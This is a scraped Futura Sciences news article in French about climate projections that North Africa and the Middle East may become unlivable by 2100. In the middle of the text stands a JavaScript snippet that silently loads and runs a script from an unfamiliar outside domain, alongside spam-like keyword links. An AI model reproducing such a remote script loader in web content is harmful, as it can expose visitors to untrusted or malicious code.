{"title": "L'Afrique du Nord et le Moyen-Orient seront-ils invivables vers 2100 ?", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2016-05-22", "content": "Des climatologues ont predit que les temperatures extremes et les vagues de chaleur vont augmenter en Afrique du Nord et au Moyen-Orient. Si rien n'est fait pour lutter contre le rechauffement climatique, ces regions finiront par devenir invivables pour des centaines de millions de personnes au cours de ce siecle. Une prediction a garder en tete au moment de la COP 23 et alors que plusieurs experts pensent que ce but ne pourra pas etre atteint dans les temps sans developper l'energie nucleaire. Le bulletin meteo de 2050 prevoit de fortes chaleurs                       A quoi pourrait ressembler le bulletin meteo en 2050 ? En partenariat avec l'Organisation Meteorologique Mondiale, une simulation avait ete realisee a l'occasion de la COP 20, en 2014, et diffusee par Meteo France. Les etudes menees depuis n'ont guere change les predictions.                                       Article publie le 22/05/2016 Les habitues des videos des conferences de Jean-Marc Jancovici ne seront nullement etonnes par une publication recente de chercheurs de l'Institut Max  Planck  de  chimie  en Allemagne et l'Institut de Chypre. Elle donne plus de poids a l'idee que les changements climatiques qui sont en cours en Afrique du Nord et au Moyen-Orient vont  destabiliser  fortement ces regions, poussant des dizaines voire des centaines de millions de personnes d'ici la fin du XXI e  siecle a emigrer. Les temperatures, les ondes de chaleurs et les  tempetes  de poussieres risquent de rendre ces regions absolument invivables, et ce, sans compter la  diminution de la pluviosite  qui est deja observee, menacant la production de nourriture. Pour arriver a cette conclusion, les chercheurs ont conduit des simulations avec 26  modeles climatiques  differents et en examinant deux scenarios distincts : l'un, ideal, que les  emissions  de  gaz a effet de serre  diminueraient en 2040 du fait de l'action concertee et responsable des pays, l'autre que la  biosphere  serait geree selon le scenario  << business-as-usual >>.  Meme dans le meilleur des cas, les conclusions atteintes et qui sont exposees dans le journal  Climatic Change  restent inquietantes. Dans une de ses conferences, a l'ESPCI Paris Tech le jeudi 19 novembre 2015, Jean-Marc Jancovici explique les liens existant entre energie, changement climatique et histoire des societes humaines. Il met en garde contre les risques de guerres que ces liens impliquent. (c) Jean-Marc Jancovici, YouTube 100 a 200 jours de canicules a l'horizon 2100 ? En effet, en tout etat de cause, les temperatures en ete vont augmenter au Moyen-Orient et en Afrique du Nord et ce, non seulement jusqu'a deux fois plus rapidement que la moyenne pour la Planete mais peut-etre aussi d'un facteur deux. Meme en maintenant cette augmentation a 2 degC, les temperatures en ete, certains jours, pourraient ne pas descendre en dessous de 30 degC la nuit et atteindre 46 degC la journee. Surtout, alors qu'entre 1986 et 2005, il faisait tres chaud pendant une  duree  moyenne d'environ 16 jours, ce chiffre pourrait etre porte a 80 vers 2050 et plus de 100 vers 2100. Si rien n'est fait, que ce soit en utilisant massivement des  energies renouvelables  ou en  sequestrant  le CO 2 , ce chiffre sera meme de 200. Au Moyen-Orient et en Afrique du Nord, la temperature moyenne en hiver augmentera d'environ 2,5 degres Celsius (a gauche) vers le milieu du siecle, et en ete d'environ cinq degres Celsius (a droite) si les emissions mondiales de gaz a effet de serre continuent d'augmenter selon le scenario  business-as-usual  (RCP8,5). (c) MPI                               Et comme si cela ne suffisait pas, les chercheurs prevoient aussi une augmentation des  vagues  de  chaleur  peut-etre d'un facteur 10. On n'ose imaginer ce qui se produirait alors pour des populations fragilisees par l'age et entassees dans des villes ou l' eau  serait rare et la  climatisation  impossible par manque d' energie . Surtout que l'on constate deja que la poussiere du  desert  dans l' atmosphere  au-dessus de l'Arabie Saoudite, l'Irak et en Syrie a augmente jusqu'a 70 % depuis le debut de ce siecle et que cela devrait continuer, elevant du meme coup la pollution de l' air .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Sur les quelque 500 millions de personnes vivant en Afrique du Nord et au Moyen-Orient, combien helas ne pourront pas quitter leurs pays (pour aller ou?) ? La reponse a cette question va certainement determiner l'Histoire autour du  bassin  mediterraneen au cours de ce siecle. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  elephant afrique du nord  |  leopard extreme orient  |  extreme orient russe  |  siemens wm 2100  |  canon bjc 2100  |  siwatherm txl 2100  |  ampli boost pa 2100  |  afrique maladies  |  afrique mousson  |  parasites en afrique", "theme": "planete"}